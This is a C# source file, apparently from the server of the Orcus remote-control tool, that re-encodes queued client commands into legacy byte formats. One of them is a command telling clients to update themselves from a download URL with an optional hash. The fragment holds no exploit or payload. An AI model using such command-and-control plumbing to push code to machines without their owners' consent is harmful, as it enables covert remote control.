using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Orcus.Server.Core.Extensions;
using Orcus.Shared.Core;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core.DynamicCommands
{
    public static class CompatibilityManager
    {
        public static byte[] GetOldPotentialCommand(PotentialCommand potentialCommand)
        {
            return
                new Serializer(typeof(OldPotentialCommand)).Serialize(new OldPotentialCommand
                {
                    CallbackId = potentialCommand.CallbackId,
                    CommandId = potentialCommand.CommandId,
                    ExecutionEvent = potentialCommand.ExecutionEvent,
                    Parameter = potentialCommand.Parameter,
                    PluginHash = potentialCommand.PluginHash,
                    PluginResourceId = potentialCommand.PluginResourceId
                });
        }

        [Serializable]
        private class OldPotentialCommand
        {
            public Guid CommandId { get; set; }
            public byte[] Parameter { get; set; }
            public ExecutionEvent ExecutionEvent { get; set; }
            public int CallbackId { get; set; }
            public byte[] PluginHash { get; set; }
            public int PluginResourceId { get; set; }
        }

        public static byte[] UpdateCommandToOldUpdateCommand(PotentialCommand potentialCommand)
        {
            var result = new byte[8 + potentialCommand.Parameter.Length];
            Array.Copy(BitConverter.GetBytes(potentialCommand.CallbackId), result, 4);
            Array.Copy(BitConverter.GetBytes(0), 0, result, 4, 4);
            Array.Copy(potentialCommand.Parameter, 0, result, 8, potentialCommand.Parameter.Length);
            return result;
        }

        public static byte[] UpdateFromUrlCommandToOldUpdateFromUrlCommand(PotentialCommand potentialCommand)
        {
            var properties =
                new Serializer(typeof (List<PropertyNameValue>)).Deserialize<List<PropertyNameValue>>(
                    potentialCommand.Parameter);
            var urlData = Encoding.UTF8.GetBytes((string) properties.First(x => x.Name == "DownloadUrl").Value);
            var hashString = (string) properties.First(x => x.Name == "Hash").Value;
            var useHash = !string.IsNullOrEmpty(hashString);

            var result = new byte[8 + 1 + urlData.Length + (useHash ? 32 : 0)];
            Array.Copy(BitConverter.GetBytes(potentialCommand.CallbackId), result, 4);
            Array.Copy(BitConverter.GetBytes(7), 0, result, 4, 4);

            result[8] = (byte) (useHash ? 1 : 0);
            if (useHash)
                Array.Copy(StringExtensions.HexToBytes(hashString), 0, result, 9, 32);

            Array.Copy(urlData, 0, result, 9 + (useHash ? 32 : 0), urlData.Length);

            return result;
        }
    }
}